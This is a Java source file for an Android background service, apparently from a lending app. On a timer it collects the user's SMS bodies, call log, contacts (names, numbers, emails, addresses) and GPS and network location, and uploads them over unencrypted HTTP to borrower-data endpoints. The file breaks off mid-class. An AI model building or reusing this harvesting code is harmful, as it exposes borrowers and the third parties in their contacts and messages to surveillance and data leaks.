package in.co.cioc.i2i;

import android.Manifest;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.TimeUnit;

import static in.co.cioc.i2i.LoginActivity.PREF_EMAIL;
import static in.co.cioc.i2i.LoginActivity.PREF_ID;
import static in.co.cioc.i2i.LoginActivity.PREF_LNAME;
import static in.co.cioc.i2i.LoginActivity.PREF_MNAME;
import static in.co.cioc.i2i.LoginActivity.PREF_PASSWORD;
import static in.co.cioc.i2i.LoginActivity.PREF_PHONE;
import static in.co.cioc.i2i.MainActivity.getMonthInt;
import static in.co.cioc.i2i.MainActivity.getYearInt;
import static in.co.cioc.i2i.MainActivity.getdayInt;

/**
 * Created by SatyamMittal on 22-06-2017.
 */
public class BackServicce extends Service {
    // constant
    public static final long NOTIFY_INTERVAL = 86400*1000; // 86400 seconds
    String usr_fname, usr_mname, usr_lname, usr_email, usr_phone;
    int usr_id;
    String h;
    String usr_name;
    // run on another Thread to avoid crash
    private Handler mHandler = new Handler();
    // timer handling
    private Timer mTimer = null;
    private Timer mTimer2 = null;
    int sendc = 0;
    int sends = 0;
    Map<String,String> newmap;
    int sendm = 0;
    JSONArray smsarr;
    JSONArray contactsarr;
    JSONArray callarr;
    String strDate = "";
    String stro = "";
    int start=0;
    LocationManager locationManager;
    double longitudeGPS, latitudeGPS;
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public String PREFS_NAME = "mypre";
    public String PREF_FNAME = "un";
    public String PREF_EMAIL = "ue";
    public String PREF_PHONE = "up";
    public String PREF_ID = "uid";
    public static String PREF_strdate = "strdate";
    String strdatef = " ";
    JSONArray json_location;

    @Override
    public void onCreate() {
        SharedPreferences pref = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        usr_id = Integer.valueOf(pref.getString(PREF_ID, "0"));
        usr_phone = pref.getString(PREF_PHONE, null);
        usr_name = pref.getString(PREF_FNAME, null);
        usr_email = pref.getString(PREF_EMAIL, null);
        stro = pref.getString(PREF_strdate, "");
        smsarr = new JSONArray();
        contactsarr = new JSONArray();
        callarr = new JSONArray();
        if(pref.getString("verified",null)==null)
            return;
        newmap = new HashMap<String, String>();
        // cancel if already existed
        if (mTimer != null) {
            mTimer.cancel();
        } else {
            // recreate new
            mTimer = new Timer();
        }
        mTimer2 = new Timer();
        locationtimer();
        // schedule task
        mTimer.scheduleAtFixedRate(new TimeDisplayTimerTask(), 0, NOTIFY_INTERVAL);
    }
    public void locationtimer()
    {
        Calendar today = Calendar.getInstance();
        today.set(Calendar.HOUR_OF_DAY, 2);
        today.set(Calendar.MINUTE, 0);
        today.set(Calendar.SECOND, 0);
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        mTimer2.schedule(new LocationTask(),today.getTime(), TimeUnit.MILLISECONDS.convert(4, TimeUnit.HOURS));
    }
    public void locationupdate() {
        json_location =new JSONArray();
        //locationManager.requestLocationUpdates(
        //		LocationManager.GPS_PROVIDER, 2 * 60 * 1000, 10, locationListenerGPS);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        if (isGPSLocationEnabled()) {
            Location location = locationManager
                    .getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location != null) {
                latitudeGPS = location.getLatitude();
                longitudeGPS = location.getLongitude();
            }
            JSONObject gps_loc = new JSONObject();
            try {
                gps_loc.put("user_id", Integer.valueOf(usr_id));
                gps_loc.put("type", "GPS");
                gps_loc.put("longitude", longitudeGPS);
                gps_loc.put("lattitude", latitudeGPS);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            json_location.put(gps_loc);
        }
        if (isNetworkLocationEnabled()) {
            Location location2 = locationManager
                    .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (location2 != null) {
                latitudeGPS = location2.getLatitude();
                longitudeGPS = location2.getLongitude();
            }
            JSONObject gps_loc2 = new JSONObject();
            try {
                gps_loc2.put("user_id", Integer.valueOf(usr_id));
                gps_loc2.put("type", "Network");
                gps_loc2.put("longitude", longitudeGPS);
                gps_loc2.put("lattitude", latitudeGPS);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            json_location.put(gps_loc2);
        }
        uploadlocation(json_location);
    }

    private  void uploadlocation(final JSONArray location)
    {
        String url = "http://www.stagingi2i.com:3000/myapp/borrowerphonelocation";
        com.android.volley.RequestQueue MyRequestQueue = Volley.newRequestQueue(this);
        StringRequest MyStringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                //   Log.d("resp2",response);

                //This code is executed if the server responds, whether or not the response contains data.
                //The String 'response' contains the server's response.
            }
        }, new Response.ErrorListener() { //Create an error listener to handle errors appropriately.
            @Override
            public void onErrorResponse(VolleyError error) {
                //     Log.d("sms",String.valueOf(error));
                //This code is executed if there is an error.
            }
        }) {
            protected Map<String, String> getParams() {
                Map<String, String> MyData = new HashMap<String, String>();
                MyData.put("location", String.valueOf(location)); //Add the data you'd like to send to the server.
                Log.d("assa", String.valueOf(location));
                return MyData;
            }
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String>  params = new HashMap<String, String>();
                params.put("Content-Type", "application/x-www-form-urlencoded;charset=utf-8");
                return params;
            }
        };

        //logLargeString("smsarr2",String.valueOf(smsarr));
        MyStringRequest.setRetryPolicy(new DefaultRetryPolicy(50 * 1000, -1,
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
        MyRequestQueue.add(MyStringRequest);
    }

    private boolean isGPSLocationEnabled() {
        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
    }
    private boolean isNetworkLocationEnabled() {
        return locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
    }
    public boolean isJSONValid(String test) {
        try {
            new JSONObject(test);
        } catch (JSONException ex) {
            try {
                new JSONArray(test);
            } catch (JSONException ex1) {
                return false;
            }
        }
        return true;
    }
    void synccontacts() {
        ContentResolver cr = getContentResolver();
        SimpleDateFormat sdf2 = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
        Date dateStart;
        String filter = null;
        //String.valueOf("timer"+"asss"+stro);
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, filter, null, null);
        String cname;
        String cphone;
        String cemail;
        String cstreet;
        String ccity;
        String cpostal;
        String clocation;
        int newg=0;
        int tesu = 0;
        if (cur.getCount() > 0) {
            tesu = 0;
            while (cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                //Log.d("name",": "+name);
                cphone = "";
                cemail = "";
                clocation = "null";
                cstreet = "";
                ccity = "";
                cpostal = "";
                cname = name;
                JSONArray jo = new JSONArray();
                JSONArray jo1 = new JSONArray();
                JSONObject conc = new JSONObject();
                int counterp = 0;
                String PhoneNumberOne = "";
                String PhoneNumberTwo = "";
                String PhoneNumberThree = "";
                String EmailOne = "";
                String EmailTwo = "";
                String EmailThree = "";

                if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    //Query phone here.  Covered next
                    String contactId = cur.getString(cur.getColumnIndex(ContactsContract.PhoneLookup._ID));
                    if (Integer.parseInt(cur.getString(
                            cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                        String[] PHONES_PROJECTION = new String[]{"_id", "display_name", "data1", "data3"};//
                        Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, PHONES_PROJECTION,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId, null, null);
                        while (pCur.moveToNext()) {
                            // Do something with phones
                            counterp++;
                            if(!newmap.containsKey(pCur.getString(2))){
                                newg=1;
                                newmap.put(pCur.getString(2),name);
                            }
                            if (counterp == 1)
                                PhoneNumberOne = pCur.getString(2);
                            else if (counterp == 2)
                                PhoneNumberTwo = pCur.getString(2);
                            else
                                PhoneNumberThree = pCur.getString(2);
                            //jo.put(pCur.getString(2));

                            //          Log.d("ss",pCur.getString(2));
                        }
                        pCur.close();
                    }
                    int countere = 0;
                    Cursor emailCur = cr.query(
                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (emailCur.moveToNext()) {
                        countere++;
                        // This would allow you get several email addresses
                        // if the email addresses were stored in an array
                        String email = emailCur.getString(
                                emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                        //   Log.d("email2",": "+email);
                        if (countere == 1)
                            EmailOne = "";
                        else if (countere == 2)
                            EmailTwo = "";
                        else
                            EmailThree = "";
                        //jo1.put(email);
                        String ee = "Email" + String.valueOf(countere);
                        try {
                            conc.put(ee, email);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        cemail += email + '\n';

                        String emailType = emailCur.getString(
                                emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
                    }
                    emailCur.close();
                    String addrWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                    String[] addrWhereParams = new String[]{id,
                            ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE};
                    Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI,
                            null, addrWhere, addrWhereParams, null);
                    while (addrCur.moveToNext()) {
                        String poBox = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POBOX));
                        String street = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
                        cstreet += street + '\n';
                        String city = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
                        ccity += city + '\n';
                        //    Log.d("city",city+"assa");
                        String state = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
                        String postalCode = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
                        cpostal += postalCode + '\n';
                        String country = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
                        String type = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
                    }
                    addrCur.close();
                }
                try {
                    conc.put("user_id", String.valueOf(usr_id));
                    conc.put("Timestamp", strdatef);
                    conc.put("OwnerName", usr_name);
                    conc.put("OwnerPhone", usr_phone);
                    conc.put("OwnerEmail", usr_email);
                    conc.put("PhoneNumberOne", PhoneNumberOne);
                    conc.put("PhoneNumberTwo", PhoneNumberTwo);
                    conc.put("PhoneNumberThree", PhoneNumberThree);
                    conc.put("EmailOne", EmailOne);
                    conc.put("EmailTwo", EmailTwo);
                    conc.put("EmailThree", EmailThree);
                    conc.put("Name", cname);
                    conc.put("Street", cstreet);
                    conc.put("City", ccity);
                    conc.put("PostalCode", cpostal);
                    conc.put("Location", clocation);
                    if (newg ==1)
                        contactsarr.put(conc);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                final String fcname = cname, fcphone = cphone, fcemail = cemail, fcstreet = cstreet, fccity = ccity, fcpostal = cpostal, fclocation = clocation;
                //executor2.execute(new contacts(fcname, fcphone, fcemail, fcstreet, fccity, fcpostal, fclocation));
            }
        }
        if(contactsarr.length()==0){
            Calendar c = Calendar.getInstance();
            SimpleDateFormat sdf = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
            strDate = sdf.format(c.getTime());

            getSharedPreferences(PREFS_NAME,MODE_PRIVATE)
                    .edit()
                    .putString(PREF_strdate,strDate).apply();
            return;
        }
        com.android.volley.RequestQueue MyRequestQueue = Volley.newRequestQueue(this);
        String url = "http://www.stagingi2i.com:3000/myapp/borrowerphonecontacts";
        StringRequest MyStringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                sendc = 1;
                //Log.d("resp1",response);
                if (sends == 1 && sendc == 1 && sendm == 1) {
                  //  Log.d("ass", "anss23");
                    sendbmail bm = new sendbmail();
                    bm.execute();
                }    //This code is executed if the server responds, whether or not the response contains data.
                //The String 'response' contains the server's response.
            }
        }, new Response.ErrorListener() { //Create an error listener to handle errors appropriately.
            @Override
            public void onErrorResponse(VolleyError error) {
                //This code is executed if there is an error.
            }
        }) {
            protected Map<String, String> getParams() {
                Map<String, String> MyData = new HashMap<String, String>();
                MyData.put("contacts", String.valueOf(contactsarr)); //Add the data you'd like to send to the server.
                return MyData;
            }
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> params = new HashMap<String, String>();
                params.put("Content-Type", "application/x-www-form-urlencoded;charset=utf-8");
                return params;
            }
        };
        if(isJSONValid(contactsarr.toString())) {
            MyStringRequest.setRetryPolicy(new DefaultRetryPolicy(120 * 1000, -1,
                    DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
            MyRequestQueue.add(MyStringRequest);
        }
    }
    void synccontacts2() {
        ContentResolver cr = getContentResolver();
        SimpleDateFormat sdf2 = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
        Date dateStart;
        String filter = null;
        String.valueOf("timer"+"asss"+stro);
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, filter, null, null);
        String cname;
        String cphone;
        String cemail;
        String cstreet;
        String ccity;
        String cpostal;
        String clocation;
        int counter = 1000;
        int tesu = 0;
        if (cur.getCount() > 0) {
            tesu = 0;
            while (cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                //Log.d("name",": "+name);
                cphone = "";
                cemail = "";
                clocation = "null";
                cstreet = "";
                ccity = "";
                cpostal = "";
                cname = name;
                JSONArray jo = new JSONArray();
                JSONArray jo1 = new JSONArray();
                JSONObject conc = new JSONObject();
                int counterp = 0;
                String PhoneNumberOne = "";
                String PhoneNumberTwo = "";
                String PhoneNumberThree = "";
                String EmailOne = "";
                String EmailTwo = "";
                String EmailThree = "";

                if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    //Query phone here.  Covered next
                    String contactId = cur.getString(cur.getColumnIndex(ContactsContract.PhoneLookup._ID));
                    if (Integer.parseInt(cur.getString(
                            cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                        String[] PHONES_PROJECTION = new String[]{"_id", "display_name", "data1", "data3"};//
                        Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, PHONES_PROJECTION,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId, null, null);
                        while (pCur.moveToNext()) {
                            // Do something with phones
                            counterp++;
                            newmap.put(pCur.getString(2),cname);
                            if (counterp == 1)
                                PhoneNumberOne = pCur.getString(2);
                            else if (counterp == 2)
                                PhoneNumberTwo = pCur.getString(2);
                            else
                                PhoneNumberThree = pCur.getString(2);
                            //jo.put(pCur.getString(2));

                            //          Log.d("ss",pCur.getString(2));
                        }
                        pCur.close();
                    }
                    int countere = 0;
                    Cursor emailCur = cr.query(
                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (emailCur.moveToNext()) {
                        countere++;
                        // This would allow you get several email addresses
                        // if the email addresses were stored in an array
                        String email = emailCur.getString(
                                emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                        //   Log.d("email2",": "+email);
                        if (countere == 1)
                            EmailOne = "";
                        else if (countere == 2)
                            EmailTwo = "";
                        else
                            EmailThree = "";
                        //jo1.put(email);
                        String ee = "Email" + String.valueOf(countere);
                        try {
                            conc.put(ee, email);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        cemail += email + '\n';

                        String emailType = emailCur.getString(
                                emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
                    }
                    emailCur.close();
                    String addrWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                    String[] addrWhereParams = new String[]{id,
                            ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE};
                    Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI,
                            null, addrWhere, addrWhereParams, null);
                    while (addrCur.moveToNext()) {
                        String poBox = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POBOX));
                        String street = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
                        cstreet += street + '\n';
                        String city = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
                        ccity += city + '\n';
                        //    Log.d("city",city+"assa");
                        String state = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
                        String postalCode = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
                        cpostal += postalCode + '\n';
                        String country = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
                        String type = addrCur.getString(
                                addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
                    }
                    addrCur.close();
                }
            }
        }

    }

    public List<Sms> getAllSms(String folderName) {
        List<Sms> lstSms = new ArrayList<Sms>();
        Sms objSms = new Sms();
        Uri message = Uri.parse("content://sms/" + folderName);
        ContentResolver cr = getContentResolver();
        SimpleDateFormat sdf2 = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
        Date dateStart;
        String filter = null;
        try {
            dateStart = sdf2.parse(stro);
            filter = "date>=" + dateStart.getTime();
        } catch (ParseException e) {
            e.printStackTrace();
        }
        Cursor c = cr.query(message, null, filter, null, null);
        int totalSMS = c.getCount();
        int counter = 300;
        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {

                objSms = new Sms();
                //	Log.d("asa", c.toString());
                objSms.setId(c.getString(c.getColumnIndexOrThrow("_id")));
                String cid = c.getString(c.getColumnIndexOrThrow("_id"));
                objSms.setAddress(c.getString(c
                        .getColumnIndexOrThrow("address")));
                String cadd = c.getString(c.getColumnIndexOrThrow("address"));
                objSms.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
                String cbody = c.getString(c.getColumnIndexOrThrow("body"));
                objSms.setReadState(c.getString(c.getColumnIndex("read")));
                String cread = c.getString(c.getColumnIndexOrThrow("read"));
                objSms.setTime(c.getString(c.getColumnIndexOrThrow("date")));
                String cdate = c.getString(c.getColumnIndexOrThrow("date"));
                //	Log.d("date", cdate);
                SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy");
                String day = "-", month = "-", year = "-";
                String date2="";
                try {
                    Date date = new Date(Long.parseLong(cdate));
                    day = getdayInt(date);
                    month = getMonthInt(date);
                    year = getYearInt(date);
                    date2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(date);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                lstSms.add(objSms);
                c.moveToNext();
                final String fcname = cid, fcphone = cadd, fcemail = cbody, fcstreet = cread, fccity = day, fcpostal = month, fclocation = year;
                String sy = usr_phone, sy2 = fcphone;
                if (folderName.equals("inbox")) {
                    sy2 = usr_phone;
                    sy = fcphone;
                }
                final String x1 = sy;
                final String x2 = sy2;
                JSONObject j1 = new JSONObject();
                try {
                    j1.put("user_id", String.valueOf(usr_id));
                    j1.put("Timestamp", strdatef);
                    j1.put("OwnerName", usr_name);
                    j1.put("OwnerPhone", usr_phone);
                    j1.put("OwnerEmail", usr_email);
                    j1.put("MessageID", fcname);
                    j1.put("SenderAddress", x1);
                    j1.put("ReceiverAddress", x2);
                    j1.put("Message", fcemail);
                    j1.put("ReadState", fcstreet);
                    j1.put("Date", date2);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                //executor.execute(new sms2(fcname, x1, x2, fcemail, fcstreet, fccity, fcpostal, fclocation));
                counter--;
                if (counter > 0)
                    smsarr.put(j1);
            }

        }

        // else {
        // throw new RuntimeException("You have no SMS in " + folderName);
        // }
        c.close();
        return lstSms;
    }

    private String getCallDetails(Context context) {
        final StringBuffer stringBuffer = new StringBuffer();
        final StringBuffer stringBufferp = new StringBuffer();
        final StringBuffer stringBuffert = new StringBuffer();
        final StringBuffer stringBufferda = new StringBuffer();
        final StringBuffer stringBufferdu = new StringBuffer();

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            addsms();
            return "permission_not_granted";
        }
        SimpleDateFormat sdf2 = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
        Date dateStart;
        String filter = null;
        try {
            dateStart = sdf2.parse(stro);
            filter = "date>=" + dateStart.getTime();
            //Log.d("assa",stro);
        } catch (ParseException e) {
            e.printStackTrace();
        }
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, filter, null, CallLog.Calls.DATE + " DESC");
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        int count = 0;
        int max = 200;
        while (cursor.moveToNext()) {
            if (count > max)
                break;
            count++;
            String phNumber = cursor.getString(number);
            String callType = cursor.getString(type);
            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String date2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(callDayTime);
            String callDuration = cursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            JSONObject jh = new JSONObject();
            try {
                jh.put("user_id", String.valueOf(usr_id));
                jh.put("Timestamp", strdatef);
                jh.put("OwnerName", usr_name);
                jh.put("OwnerPhone", usr_phone);
                jh.put("OwnerEmail", usr_email);
                jh.put("PhoneNumber", phNumber);
                jh.put("CallType", dir);
                jh.put("CallDateTime", date2);
                jh.put("CallDuration", callDuration);
                callarr.put(jh);
            } catch (JSONException e) {
                e.printStackTrace();
            }

            stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            stringBufferp.append(phNumber + '\n');
            stringBuffert.append(dir + '\n');
            stringBufferda.append(callDayTime + "\n");
            stringBufferdu.append(callDuration + '\n');
            stringBuffer.append("\n----------------------------------");
        }
        cursor.close();
        //Log.d("sasa",callarr.toString());
        if(callarr.length()==0){
            addsms();
            return null;
        }
        //executor2.execute(new call(stringBufferp.toString(),stringBuffert.toString(),stringBufferda.toString(),stringBufferdu.toString(),""));
        com.android.volley.RequestQueue MyRequestQueue = Volley.newRequestQueue(this);
        String url = "http://www.stagingi2i.com:3000/myapp/borrowerphonecalllog";
        StringRequest MyStringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                sendm = 1;
                //Log.d("resp3",response);
                if (sends == 1 && sendc == 1 && sendm == 1) {
                    sendbmail bm = new sendbmail();
                    bm.execute();
                }
                else{
                    addsms();
                }

                //This code is executed if the server responds, whether or not the response contains data.
                //The String 'response' contains the server's response.
            }
        }, new Response.ErrorListener() { //Create an error listener to handle errors appropriately.
            @Override
            public void onErrorResponse(VolleyError error) {
                addsms();
                //This code is executed if there is an error.
            }
        }) {
            protected Map<String, String> getParams() {
                Map<String, String> MyData = new HashMap<String, String>();
                MyData.put("calllog", String.valueOf(callarr)); //Add the data you'd like to send to the server.
                return MyData;
            }
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> params = new HashMap<String, String>();
                params.put("Content-Type", "application/x-www-form-urlencoded;charset=utf-8");
                return params;
            }
        };
        if(isJSONValid(callarr.toString()))
        {
            MyStringRequest.setRetryPolicy(new DefaultRetryPolicy(120 * 1000, -1,
                    DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
            MyRequestQueue.add(MyStringRequest);
        }
        else
            addsms();


        return stringBuffer.toString();
    }
    void addsms(){
        if (ContextCompat.checkSelfPermission(BackServicce.this, Manifest.permission.READ_SMS)	== PackageManager.PERMISSION_GRANTED)
        {
            getAllSms("inbox");
            getAllSms("sent");

        }
        if(smsarr.length()==0){
            if (ContextCompat.checkSelfPermission(BackServicce.this, Manifest.permission.READ_CONTACTS)
                    == PackageManager.PERMISSION_GRANTED) {
                synccontacts();
                //t.start();
            }
            return;
        }
        com.android.volley.RequestQueue MyRequestQueue = Volley.newRequestQueue(this);
        String url = "http://www.stagingi2i.com:3000/myapp/borrowerphonesms";
        StringRequest MyStringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                sends=1;
                //Log.d("resp2",response);
                if(sends==1 && sendc==1 && sendm==1) {
                    sendbmail bm = new sendbmail();
                    bm.execute();
                }
                else
                    {
                    if (ContextCompat.checkSelfPermission(BackServicce.this, Manifest.permission.READ_CONTACTS)
                            == PackageManager.PERMISSION_GRANTED) {
                        synccontacts();
                        //t.start();
                    }
                }
                //This code is executed if the server responds, whether or not the response contains data.
                //The String 'response' contains the server's response.
            }
        }, new Response.ErrorListener() { //Create an error listener to handle errors appropriately.
            @Override
            public void onErrorResponse(VolleyError error) {
                if (ContextCompat.checkSelfPermission(BackServicce.this, Manifest.permission.READ_CONTACTS)
                        == PackageManager.PERMISSION_GRANTED) {
                    synccontacts();
                    //t.start();
                }
                //This code is executed if there is an error.
            }
        }) {
            protected Map<String, String> getParams() {
                Map<String, String> MyData = new HashMap<String, String>();
                MyData.put("sms", String.valueOf(smsarr)); //Add the data you'd like to send to the server.
                return MyData;
            }
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> params = new HashMap<String, String>();
                params.put("Content-Type", "application/x-www-form-urlencoded;charset=utf-8");
                return params;
            }
        };
        if(isJSONValid(smsarr.toString())) {
            MyStringRequest.setRetryPolicy(new DefaultRetryPolicy(120 * 1000, -1,
                    DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
            MyRequestQueue.add(MyStringRequest);
        }else{
            if (ContextCompat.checkSelfPermission(BackServicce.this, Manifest.permission.READ_CONTACTS)
                    == PackageManager.PERMISSION_GRANTED) {
                synccontacts();
                //t.start();
            }
        }


    }
    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
    void syncallcontacts(){
        int SPLASH_TIME_OUT = 10000;
        //time a = new time();
        //a.execute();
        if (ContextCompat.checkSelfPermission(BackServicce.this, Manifest.permission.READ_CALL_LOG)
                == PackageManager.PERMISSION_GRANTED) {
            getCallDetails(this);
        }


        Calendar c = Calendar.getInstance();
        SimpleDateFormat sdf = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
        strDate = sdf.format(c.getTime());
        try {
            Date dateStart = sdf.parse(strDate);
            strdatef = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(dateStart);
        } catch (ParseException e) {
            e.printStackTrace();
        }
        getSharedPreferences(PREFS_NAME,MODE_PRIVATE)
                .edit()
                .putString(PREF_strdate,strDate).apply();

        //Log.d("sasa",String.valueOf(smsarr));
        //Log.d("sasa",String.valueOf(callarr));
        //Log.d("sasa",String.valueOf(contactsarr));
    }

    class LocationTask extends TimerTask {

        @Override
        public void run() {
            // run on another thread
            mHandler.post(new Runnable() {

                @Override
                public void run() {
                    // display toast
                locationupdate();
                }

            });
        }

    }
    class TimeDisplayTimerTask extends TimerTask {

        @Override
        public void run() {
